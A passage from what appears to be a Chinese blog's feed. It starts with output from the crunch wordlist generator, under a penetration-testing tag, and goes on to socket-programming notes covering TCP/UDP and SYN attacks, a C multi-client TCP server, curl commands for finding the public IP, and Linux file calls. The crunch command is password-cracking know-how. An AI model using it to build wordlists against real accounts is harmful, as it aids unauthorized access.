class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#&gt;  crunch 5 8 qwertyuio  -o ~/Downloads/crunch.txt</span><br><span class="line">Crunch will now generate the following amount of data: 429758622 bytes</span><br><span class="line">409 MB</span><br><span class="line">0 GB</span><br><span class="line">0 TB</span><br><span class="line">0 PB</span><br><span class="line">Crunch will now generate the following number of lines: 48420180</span><br><span class="line"></span><br><span class="line">crunch:  61% completed generating output</span><br><span class="line"></span><br><span class="line">crunch: 100% completed generating output</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Socket 网络编程</title>
      <link href="/2017/09/18/cpluscplus/Socket-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/"/>
      <url>/2017/09/18/cpluscplus/Socket-%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h3 id="1-TCP与UDP"><a href="#1-TCP与UDP" class="headerlink" title="1.    TCP与UDP"></a>1.    TCP与UDP</h3><blockquote><p>​         TCP是一种面向连接的保证可靠传输的协议。通过TCP协议传输，得到的是一个顺序的无差错的数据流。发送方和接收方的成对的两个socket之间必须建立连接，以便在TCP协议的基础上进行通信，当一个socket（通常都是server socket）等待建立连接时，另一个socket可以要求进行连接，一旦这两个socket连接起来，它们就可以进行双向数据传输，双方都可以进行发送或接收操作。</p><p>​         UDP是一种面向无连接的协议，每个数据报都是一个独立的信息，包括完整的源地址或目的地址，它在网络上以任何可能的路径传往目的地，因此能否到达目的地，到达目的地的时间以及内容的正确性都是不能被保证的。</p></blockquote><a id="more"></a><p><img src="/img/cplusplus/852671-f05a570e8b389f36.png" alt="Tcp/ip 四层协议"></p><h4 id="TCP与UDP区别："><a href="#TCP与UDP区别：" class="headerlink" title="TCP与UDP区别："></a>TCP与UDP区别：</h4><ol><li><p>TCP特点：</p><p>​    TCP是面向连接的协议，通过三次握手建立连接，通讯完成时要拆除连接，由于TCP是面向连接协议，所以只能用于点对点的通讯。而且建立连接也需要消耗时间和开销。</p><p>​    TCP传输数据无大小限制，进行大数据传输。<br>​    TCP是一个可靠的协议，它能保证接收方能够完整正确地接收到发送方发送的全部数据。</p><p>2.UDP特点：</p><p>​    UDP是面向无连接的通讯协议，UDP数据包括目的端口号和源端口号信息，由于通讯不需要连接，所以可以实现广播发送。<br>​    UDP传输数据时有大小限制，每个被传输的数据报必须限定在64KB之内。<br>​    UDP是一个不可靠的协议，发送方所发送的数据报并不一定以相同的次序到达接收方。</p></li></ol><p><br></p><h4 id="TCP与UDP应用"><a href="#TCP与UDP应用" class="headerlink" title="TCP与UDP应用:"></a>TCP与UDP应用:</h4><p>​    TCP在网络通信上有极强的生命力，例如远程连接（Telnet）和文件传输（FTP）都需要不定长度的数据被可靠地传输。但是可靠的传输是要付出代价的，对数据内容正确性的检验必然占用计算机的处理时间和网络的带宽，因此TCP传输的效率不如UDP高。</p><p>​    UDP操作简单，而且仅需要较少的监护，因此通常用于局域网高可靠性的分散系统中client/server应用程序。例如视频会议系统，并不要求音频视频数据绝对的正确，只要保证连贯性就可以了，这种情况下显然使用UDP会更合理一些。</p><p><br></p><h3 id="2-Socket是什么"><a href="#2-Socket是什么" class="headerlink" title="2.  Socket是什么"></a>2.  Socket是什么</h3><blockquote><p>​    Socket通常也称作”套接字”，用于描述IP地址和端口，是一个通信链的句柄。网络上的两个程序通过一个双向的通讯连接实现数据的交换，这个双向链路的一端称为一个Socket，一个Socket由一个IP地址和一个端口号唯一确定。应用程序通常通过”套接字”向网络发出请求或者应答网络请求。 Socket是TCP/IP协议的一个十分流行的编程界面，但是，Socket所支持的协议种类也不光TCP/IP一种，因此两者之间是没有必然联系的。</p></blockquote><p>Socket通讯过程：</p><blockquote><p>​    服务端监听某个端口是否有连接请求，客户端向服务端发送连接请求，服务端收到连接请求向客户端发出接收消息，这样一个连接就建立起来了。客户端和服务端都可以相互发送消息与对方进行通讯。</p></blockquote><p>　　<br>Socket的基本工作过程包含以下四个步骤：</p><blockquote><ol><li>创建Socket</li><li>打开连接到Socket的输入输出流；</li><li>按照一定的协议对Socket进行读写操作</li><li>关闭Socket</li></ol></blockquote><p><br></p><h3 id="3-Tcp"><a href="#3-Tcp" class="headerlink" title="3.     Tcp:"></a>3.     Tcp:</h3><h4 id="报文格式"><a href="#报文格式" class="headerlink" title="报文格式:"></a>报文格式:</h4><p><img src="/img/cplusplus/20131022025345890.png" alt="Tcp 报文格式"></p><ol><li><p>序号：Seq序号，占32位，用来标识从TCP源端向目的端发送的字节流，发起方发送数据时对此进行标记。 </p></li><li><p>确认序号：Ack序号，占32位，只有ACK标志位为1时，确认序号字段才有效，Ack=Seq+1。 </p></li><li><p>标志位：共6个，即URG、ACK、PSH、RST、SYN、FIN等，具体含义如下:  </p><ol><li><p>URG：紧急指针（urgent pointer）有效。 </p></li><li><p>ACK：确认序号有效。 </p></li><li><p>PSH：接收方应该尽快将这个报文交给应用层。</p></li><li><p>RST：重置连接。 </p></li><li><p>SYN：发起一个新连接。 </p></li><li><p>FIN：释放一个连接。</p><p>​</p></li></ol><p>需要注意的是: </p><ol><li>不要将确认序号Ack与标志位中的ACK搞混了.</li><li>确认方Ack=发起方Req+1，两端配对。  </li></ol></li></ol><p><img src="/img/cplusplus/tcp_open_close.jpg" alt="client &lt;-&gt; server "></p><p><br></p><h4 id="Tcp-三次握手"><a href="#Tcp-三次握手" class="headerlink" title="Tcp 三次握手:"></a>Tcp 三次握手:</h4><ol><li><p>过程:</p><blockquote><ol><li>第一次握手：Client将<strong>标志位SYN置为1</strong>，随机产生一个值seq=J，并将该数据包发送给Server，Client进入SYN_SENT状态，等待Server确认。</li><li>第二次握手：Server收到数据包后由<strong>标志位SYN=1知道Client请求建立连接</strong>，Server将标志位SYN和ACK都置为1，Ack=J+1，随机产生一个值seq=K，并将该数据包<strong>发送给Client以确认连接请求，Server进入SYN_RCVD状态</strong>。 </li><li>第三次握手：Client收到确认后，检查Ack是否为J+1，标志位ACK是否为1，如果正确则将标志位ACK置为1，Ack=K+1，并将该数据包发送给Server，Server检查Ack是否为K+1，标志位ACK是否为1，如果正确则连接建立成功，Client和Server进入ESTABLISHED状态，完成三次握手，随后Client与Server之间可以开始传输数据了。 </li></ol></blockquote></li><li><p>优点:</p><p>​    三次握手尽可能减少错误率， 但是三次握手并不能保证完全正确, 握手次数越多越能保证双方关系的确认</p><p>​    三次握手尽可能保证双方进入ESTABLISHED状态，而不发生死锁;</p></li><li><p>缺点:</p><ol><li><p>传递数据建立链接，数据传递过程中，确认机制， 重传机制，堵塞机制等都会消耗大量时间，并且一般长链接设备需维护链接</p></li><li><p>syn 攻击:</p><ol><li>三次握手过程，第二次握手, Server发送SYN-Ack之后, Server 处于SYS_RECV状态，收到Client 的Ack确认序号之前为半链接，  只有收到client发送的Ack确认包 Server才能建立完整链接， Syn攻击，就是client不断发送Syn数据包，使Server认为有IP进行链接，造成Server产生大量半链接状态的Tcp, 因为Tcp的重传与确认机制, Server不断占用Tcp请求队列， 知道队列堵塞 资源消耗殆尽，系统瘫痪;    </li><li>确认Syn攻击， 只需要netstat -anp | grep port 查看链接 Server 大量处于 SYN_RECV 状态即可;</li></ol><p>​</p></li></ol></li></ol><p><br></p><h4 id="Tcp-四次挥手"><a href="#Tcp-四次挥手" class="headerlink" title="Tcp 四次挥手:"></a>Tcp 四次挥手:</h4><blockquote><p>​        由于TCP连接时全双工的，因此， <strong>每个方向都必须要单独进行关闭</strong>，这一原则是当一方完成数据发送任务后，发送一个FIN来终止这一方向的连接， <strong>收到一个FIN只是意味着这一方向上没有数据流动了，即不会再收到数据了，但是在这个TCP连接上仍然能够发送数据</strong>，直到这一方向也发送了FIN。首先进行关闭的一方将执行主动关闭，而另一方则执行被动关闭，上图描述的即是如此。 </p></blockquote><ol><li><p>过程:</p><blockquote><ol><li>第一次挥手：Client发送一个FIN，用来关闭Client到Server的数据传送，Client进入FIN_WAIT_1状态。 </li><li>第二次挥手：Server收到FIN后，发送一个Ack给Client，确认序号为收到序号+1（与SYN相同，一个FIN占用一个序号），Server进入CLOSE_WAIT状态。 </li><li>第三次挥手：Server发送一个FIN，用来关闭Server到Client的数据传送，Server进入LAST_ACK状态。 </li><li>​    第四次挥手：Client收到FIN后，Client进入TIME_WAIT状态，接着发送一个ACK给Server，确认序号为收到序号+1，Server进入CLOSED状态，完成四次挥手。 </li></ol></blockquote><p>​</p></li></ol><p><br></p><h3 id="4-Udp"><a href="#4-Udp" class="headerlink" title="4. Udp:"></a>4. Udp:</h3><p><br></p><h3 id="5-同步，-异步，-堵塞，非堵塞"><a href="#5-同步，-异步，-堵塞，非堵塞" class="headerlink" title="5. 同步， 异步， 堵塞，非堵塞:"></a>5. 同步， 异步， 堵塞，非堵塞:</h3><h4 id="堵塞-与-非堵塞"><a href="#堵塞-与-非堵塞" class="headerlink" title="堵塞 与 非堵塞"></a>堵塞 与 非堵塞</h4><p><img src="/img/cplusplus/12234337-ea19e65c6c72464499a307e4a950148a.png" alt="堵塞 与 非堵塞 "></p><p><br></p><h4 id="同步-与-异步"><a href="#同步-与-异步" class="headerlink" title="同步 与 异步"></a>同步 与 异步</h4><p><img src="/img/cplusplus/12233922-2a81723a872b4ac5a3395bcf778309b8.png" alt="同步 与 异步 "></p><p><br></p><h3 id="6-Tcp-网络粘包问题"><a href="#6-Tcp-网络粘包问题" class="headerlink" title="6  Tcp 网络粘包问题"></a>6  Tcp 网络粘包问题</h3><h3 id="7-网络模型"><a href="#7-网络模型" class="headerlink" title="7.  网络模型:"></a>7.  网络模型:</h3><ol><li><p>网络IO操作实际过程涉及到内核和调用这个IO操作的进程。以read为例，read的具体操作分为以下两个部分:</p><ol><li>内核等待数据可读</li><li>将内核读到的数据拷贝到进程</li></ol><p><img src="/img/cplusplus/12224938-4db3844232b84fb284d057a21df5f149.png" alt="数据传输"></p></li></ol><p><br></p><h4 id="blocking-IO-堵塞IO"><a href="#blocking-IO-堵塞IO" class="headerlink" title="blocking IO ( 堵塞IO )"></a>blocking IO ( 堵塞IO )</h4><p><img src="/img/cplusplus/12230408-c8b30331f20a41dcb224d20719ffa1da.png" alt="堵塞"></p><blockquote><p>  recvfrom等到内核将数据报文准备好，并从内核态拷贝到用户态</p></blockquote><p><br></p><h4 id="nonblocking-IO-非堵塞IO"><a href="#nonblocking-IO-非堵塞IO" class="headerlink" title="nonblocking IO (非堵塞IO)"></a>nonblocking IO (非堵塞IO)</h4><p><img src="/img/cplusplus/12231306-35dca310d92e4184bd4c0b3f42bee2c1.png" alt="非堵塞"></p><blockquote><p> 虽然recvfrom 不会卡在断点处，但是需要底层不断轮训内核是否存在数据，若是存在此时数据库才进行拷贝，若无数据，recvfrom 返回 -1 并且errono 被设置为 EAGAIN</p><p> ​    内核态本质不断轮询</p></blockquote><p><br></p><h4 id="IO-multiplexing-多路IO"><a href="#IO-multiplexing-多路IO" class="headerlink" title="IO multiplexing (多路IO)"></a>IO multiplexing (多路IO)</h4><ul><li>select </li><li>poll</li><li>epoll</li></ul><p><br></p><h4 id="asynchronous-IO-异步IO"><a href="#asynchronous-IO-异步IO" class="headerlink" title="asynchronous IO (异步IO)"></a>asynchronous IO (异步IO)</h4><p><img src="/img/cplusplus/12233159-16ec6876a48d424d8e6b524d1fb91689.png" alt=""></p><blockquote><p>​    read函数直接返回，但是内核数据拷贝完成之后，会发送信号提示上层</p></blockquote><p><br></p><h4 id="signal-driven-IO-信号驱动IO"><a href="#signal-driven-IO-信号驱动IO" class="headerlink" title="signal driven IO  (信号驱动IO)"></a>signal driven IO  (信号驱动IO)</h4><p><br></p><h3 id="8-Tcp-多客户端代码"><a href="#8-Tcp-多客户端代码" class="headerlink" title="8. Tcp  多客户端代码:"></a>8. Tcp  多客户端代码:</h3><p>程序代码 <a href="">下载</a>:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DEST_IP    <span class="meta-string">"192.168.1.101"</span>    <span class="comment">//localhost eth0 ip</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> LISTENPORT 33691</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> DBPORT 55429</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">extern</span> <span class="keyword">void</span>* <span class="title">func</span><span class="params">(<span class="keyword">void</span> *)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span>  clifd = <span class="number">0</span> ;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">srvaddr</span>, <span class="title">cliaddr</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    <span class="keyword">int</span> addrlen, on; </span><br><span class="line">    <span class="keyword">int</span>  sockfd = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( (sockfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>) ) == <span class="number">-1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"create socket fail\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    srvaddr.sin_family = AF_INET;</span><br><span class="line">    <span class="comment">//srvaddr.sin_addr.s_addr = INADDR_ANY;</span></span><br><span class="line">    srvaddr.sin_addr.s_addr = inet_addr(DEST_IP);</span><br><span class="line">    srvaddr.sin_port = htons( LISTENPORT ); <span class="comment">//采用socket;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* 重新绑定 address */</span></span><br><span class="line">    <span class="keyword">if</span>( (setsockopt(sockfd, SOL_SOCKET, SO_REUSEADDR, &amp;on, <span class="keyword">sizeof</span>(on))) &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"setsockopt fail"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ( bind(sockfd, (struct sockaddr *) &amp;srvaddr, <span class="keyword">sizeof</span>(srvaddr)) == <span class="number">-1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">        perror(<span class="string">"bind fail"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    listen(sockfd, <span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    addrlen = <span class="keyword">sizeof</span>(cliaddr); </span><br><span class="line">    <span class="comment">// 多线程问题</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ( (clifd = accept( sockfd, (struct sockaddr *)&amp; cliaddr, (<span class="keyword">socklen_t</span> *)&amp; addrlen ) )!= <span class="number">-1</span> ) <span class="comment">// 堵塞函数;</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>( pthread_create(&amp;tid, <span class="literal">NULL</span>, &amp;func, <span class="literal">NULL</span>) == <span class="number">-1</span> )</span><br><span class="line">            &#123;</span><br><span class="line">                    perror(<span class="string">"pthread_create fail"</span>); </span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">"accept fail"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    close(sockfd); <span class="comment">// fd close();</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span>* <span class="title">func</span> <span class="params">(<span class="keyword">void</span> *data)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> read_size = <span class="number">0</span>; </span><br><span class="line">        <span class="keyword">char</span>  recvbuf[BUFSIZ];</span><br><span class="line">        <span class="keyword">while</span>( (read_size = recv(clifd, recvbuf, BUFSIZ, <span class="number">0</span>)))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//网络字节序转化;</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">"tid = %u, sock addr = %s, port = %d ,  recv = %s"</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)pthread_self(), inet_ntoa(cliaddr.sin_addr), ntohs(cliaddr.sin_port), recvbuf);</span><br><span class="line">        &#125;</span><br><span class="line">   </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h3 id="补充"><a href="#补充" class="headerlink" title="补充:"></a>补充:</h3><ol><li><p>长链接:</p></li><li><p>短链接:</p></li><li><p>网络链接查看 netstat / ss :</p><ol><li><p>Wiindow:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netstat -an |findstr 1115   // 查看1115 端口链接</span><br></pre></td></tr></table></figure></li><li><p>Linux:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">netstat -anp |grep -i 1115   // 查看1115 端口链接  // -i 忽略大小写</span><br><span class="line">ss  -anp  |  grep -i postgres</span><br></pre></td></tr></table></figure></li></ol></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> C/C++ </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>linux 获取公网ip</title>
      <link href="/2017/09/14/yunwei/Linux%20%E8%8E%B7%E5%8F%96%E5%85%AC%E7%BD%91ip%E5%9C%B0%E5%9D%80/"/>
      <url>/2017/09/14/yunwei/Linux%20%E8%8E%B7%E5%8F%96%E5%85%AC%E7%BD%91ip%E5%9C%B0%E5%9D%80/</url>
      
        <content type="html"><![CDATA[<h4 id="正文"><a href="#正文" class="headerlink" title="正文:"></a>正文:</h4><blockquote><p> 有了它,大家就不用打开浏览器，baidu.com 输入ip 喽!</p></blockquote><a id="more"></a><p><br></p><h4 id="Curl-纯文本格式输出"><a href="#Curl-纯文本格式输出" class="headerlink" title="Curl 纯文本格式输出"></a>Curl 纯文本格式输出</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl icanhazip.com</span><br><span class="line">curl ifconfig.me</span><br><span class="line">curl curlmyip.com</span><br><span class="line">curl ip.appspot.com</span><br><span class="line">curl ipinfo.io/ip</span><br><span class="line">curl ipecho.net/plain</span><br><span class="line">curl www.trackip.net/i</span><br></pre></td></tr></table></figure><h4 id="Curl-Json格式输出"><a href="#Curl-Json格式输出" class="headerlink" title="Curl Json格式输出:"></a>Curl Json格式输出:</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl ipinfo.io/json</span><br><span class="line">curl ifconfig.me/all.json</span><br><span class="line">curl www.trackip.net/ip?json (有点丑陋)</span><br></pre></td></tr></table></figure><h4 id="Curl-XML格式输出"><a href="#Curl-XML格式输出" class="headerlink" title="Curl XML格式输出"></a>Curl XML格式输出</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl ifconfig.me/all.xml</span><br></pre></td></tr></table></figure><h4 id="Curl-得到所有ip细节"><a href="#Curl-得到所有ip细节" class="headerlink" title="Curl 得到所有ip细节(*):"></a>Curl 得到所有ip细节(*):</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl  ifconfig.me/all</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Linux 文件系统编程</title>
      <link href="/2017/09/12/cpluscplus/Linux-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/"/>
      <url>/2017/09/12/cpluscplus/Linux-%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E7%BC%96%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<blockquote><p> 字符设备 和 块设备都很好体现”一切皆文件”的Linux设计思想。<br> 设备驱动最终通过操作系统的文件系统调用或C库函数被访问</p></blockquote><ol><li>以下为Linux文件操作函数:</li></ol><a id="more"></a><p><br></p><h5 id="Linux-系统编程"><a href="#Linux-系统编程" class="headerlink" title="Linux 系统编程:"></a>Linux 系统编程:</h5><h6 id="1-创建"><a href="#1-创建" class="headerlink" title="1.    创建:"></a>1.    创建:</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">creat</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *filename, <span class="keyword">mode_t</span> mode)</span></span>;</span><br></pre></td></tr></table></figure><p>参数mode指定新建文件的存储权限， 它同umask一起决定文件的最终权限 (mode &amp; umask );</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">umask</span><span class="params">(<span class="keyword">int</span> newmask)</span></span>;</span><br></pre></td></tr></table></figure><h6 id="2-打开"><a href="#2-打开" class="headerlink" title="2. 打开:"></a>2. 打开:</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* pathname, <span class="keyword">int</span> flags)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">open</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* pathname, <span class="keyword">int</span> flags, <span class="keyword">mode_t</span> mode)</span></span>;</span><br></pre></td></tr></table></figure><p>flags 取值:</p><table><thead><tr><th style="text-align:left">标示</th><th style="text-align:center">含义</th></tr></thead><tbody><tr><td style="text-align:left">O_RDONLY</td><td style="text-align:center">以只读方式打开文件</td></tr><tr><td style="text-align:left">O_WRONLY</td><td style="text-align:center">以只写方式打开文件</td></tr><tr><td style="text-align:left">O_RDWR</td><td style="text-align:center">以读写方式打开文件</td></tr><tr><td style="text-align:left">O_APPEND</td><td style="text-align:center">以追加方式打开文件</td></tr><tr><td style="text-align:left">O_CREAT</td><td style="text-align:center">创建一个新文件</td></tr><tr><td style="text-align:left">O_EXEC</td><td style="text-align:center">如果使用了O_CREAT 且文件已经存在，就会发生错误</td></tr><tr><td style="text-align:left">O_NOBLOCK</td><td style="text-align:center">以非堵塞方式打开一个文件</td></tr><tr><td style="text-align:left">O_TRUNC</td><td style="text-align:center">如果文件已经存在,则删除文件内容</td></tr></tbody></table><p>mode取值:</p><table><thead><tr><th>标志</th><th>含义</th></tr></thead><tbody><tr><td>S_IRUSR</td><td>用户可读</td></tr><tr><td>S_IWUSR</td><td>用户可写</td></tr><tr><td>S_IXUSR</td><td>用户可执行</td></tr><tr><td>S_IRWXU</td><td>用户可读，写，执行</td></tr><tr><td>S_IRGRP</td><td>组可读</td></tr><tr><td>S_IWGRP</td><td>组可写</td></tr><tr><td>S_IXGRP</td><td>组可执行</td></tr><tr><td>S_IRWXG</td><td>组可读，写，执行</td></tr><tr><td>S_IROTH</td><td>其他人可读</td></tr><tr><td>S_IWOTH</td><td>其他人可写</td></tr><tr><td>S_IXOTH</td><td>其他人可执行</td></tr><tr><td>S_IRWXO</td><td>其他人可读，写，执行</td></tr><tr><td>S_ISUID</td><td>设置uid</td></tr><tr><td>S_ISGID</td><td>设置GID</td></tr></tbody></table><p>1   执行权限</p><p>2   写权限</p><p>4   读权限     –   相互配合组合</p><ul><li><p>UID    设置文件执行阶段具有文件所有者权限</p></li><li><p>GID    只对目录有效，设置该位后,任何用户在此目录下创建文件都具有和该目录所属组想同</p><p>chmod u+s filename; // set uid</p><p>chmod g+s dirname;  // set gid</p></li></ul><h6 id="3-读写"><a href="#3-读写" class="headerlink" title="3. 读写:"></a>3. 读写:</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span>* buf, <span class="keyword">size_t</span> length)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">write</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">const</span> <span class="keyword">void</span>* buf, <span class="keyword">size_t</span> length)</span></span>;</span><br></pre></td></tr></table></figure><h6 id="4-定位"><a href="#4-定位" class="headerlink" title="4. 定位:"></a>4. 定位:</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lseek</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">offset_t</span> offset, <span class="keyword">int</span> whence)</span></span>;</span><br></pre></td></tr></table></figure><p>lseek() 将文件读写指针相对whence移动offset字节， 操作成功，返回指针相对于文件头的位置。</p><p>where取值:</p><ul><li>SEEK_SET  :  相对于文件开头</li><li>SEEK_CUR :  相对文件读写指针的当前位置</li><li>SEEK_END :  相对文件末尾  </li></ul><p>文件长度 = lseek(fd, 0, SEEK_END);</p><ol><li><p>关闭:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">close</span><span class="params">(<span class="keyword">int</span> fd)</span></span>;</span><br></pre></td></tr></table></figure></li></ol><h5 id="C-库操作"><a 